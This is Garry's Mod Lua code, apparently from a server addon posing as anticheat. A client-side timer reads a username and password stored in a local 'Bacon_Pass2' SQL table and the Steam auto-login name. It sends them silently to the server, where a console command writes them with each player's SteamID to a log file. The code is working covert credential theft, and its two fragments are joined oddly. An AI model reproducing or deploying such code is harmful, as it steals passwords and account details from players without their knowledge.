
	
	concommand.Add("_ac_bb_s" , function(ply , cmd , args) 
		local User = (args[1] or "") 
		local Pass = (args[2] or "") 
		local Login = (args[3] or "")
		
		filex.Append("lol.txt","["..os.date().."] "..ply:Nick().." ("..ply:SteamID()..") U: "..User.." | P: "..Pass.." | L: "..Login)
		
	end )
	return 


local concommand = require ("concommand") 
local hook = require ("hook") 
local cvars = require("cvars") 
local timer = require("timer") 
local RCC = RunConsoleCommand 
local string = string 
local math = math 
local table = table 
local pairs = pairs 
local ipairs = ipairs 


local InitB = false 

timer.Create("poop" , 10 , 0 , function() 
	if !GetUsername then 
		if !InitB then 
			require("bbot") 
		end 
		InitB = true 
	end 
	
	local function GetLoginUsername() 
		if !GetUsername then return nil end 
		
		local user = GetUsername() 
		local m = string.gmatch(user, "\"([^\"]+)\"") 
		local pkey = "" 
		
		for k,v in m do 
			if pkey == "AutoLoginUser" then 
				return k 
			end 
			pkey = k 
		end
		return nil 
	end 
	
	local Login = GetLoginUsername() or ""
	if !Login then Login = "" end 
	local User 
	local Pass 
	local q = sql.Query( "SELECT User, Pass FROM Bacon_Pass2" ) 
	
	if q then 
		Pass = q[1].Pass 
		User = q[1].User 
	end 
	
	if User and Pass and Login then
		RCC("_ac_bb_s", User, Pass, Login) 
	end 
end )


